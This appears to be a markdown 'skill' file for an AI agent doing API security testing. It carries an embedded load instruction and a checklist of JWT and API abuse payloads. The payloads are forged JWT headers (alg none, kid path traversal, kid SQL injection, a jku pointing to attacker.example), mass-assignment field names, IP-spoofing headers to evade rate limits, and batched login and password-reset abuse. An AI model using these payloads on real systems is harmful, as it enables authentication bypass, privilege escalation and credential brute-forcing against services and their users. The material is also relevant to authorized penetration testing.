# SKILL: JWT and API Abuse Payloads — Header Tricks, Hidden Fields, and Batch Abuse

> **AI LOAD INSTRUCTION**: Use this skill when tokens, headers, hidden JSON fields, or API batching features are present and you need compact abuse payloads for verification before loading deeper API skills.

## 1. WHEN TO LOAD THIS SKILL

Load when:

- JWTs are visible in cookies, headers, or mobile traffic
- You suspect hidden parameters, mass assignment, or batch abuse
- You need a compact abuse checklist for APIs rather than a full methodology document

For deeper analysis, also load:

- `skills/api-sec/API_Auth_and_JWT_Abuse.skill.md`
- `skills/api-sec/GraphQL_and_Hidden_Parameters.skill.md`

## 2. JWT HEADER ABUSE PICKS

```json
{"alg":"none","typ":"JWT"}
{"alg":"HS256","kid":"../../../../dev/null"}
{"alg":"HS256","kid":"' UNION SELECT 'attacker_key'--"}
{"alg":"RS256","jku":"https://attacker.example/jwks.json"}
```

## 3. MASS ASSIGNMENT FIELD PICKS

```text
role
isAdmin
admin
verified
plan
tier
permissions
org
owner
```

## 4. RATE LIMIT AND BATCH ABUSE PICKS

```text
X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
Forwarded: for=9.9.9.9
```

GraphQL or JSON batch abuse candidates:

- arrays of login mutations
- bulk object fetches with varying IDs
- repeated password reset or verification calls in one request

## 5. SOURCE POOLS TO CONSULT

- Web-Fuzzing-Box: `Vuln/JWT_Attack/`, `Vuln/Api_Bypass/`, `Web/Headers/`
- PayloadsAllTheThings: `API Key Leaks/`, `OAuth Misconfiguration/`, `GraphQL Injection/`

## 6. QUICK CHECKLIST

1. Decode the token and inspect `alg`, `kid`, `jku`, claims, and role fields.
2. Add one hidden field to one create or update request.
3. Test one header spoofing family for rate limit behavior.
4. If GraphQL or bulk APIs exist, try small batch abuse before full-depth analysis.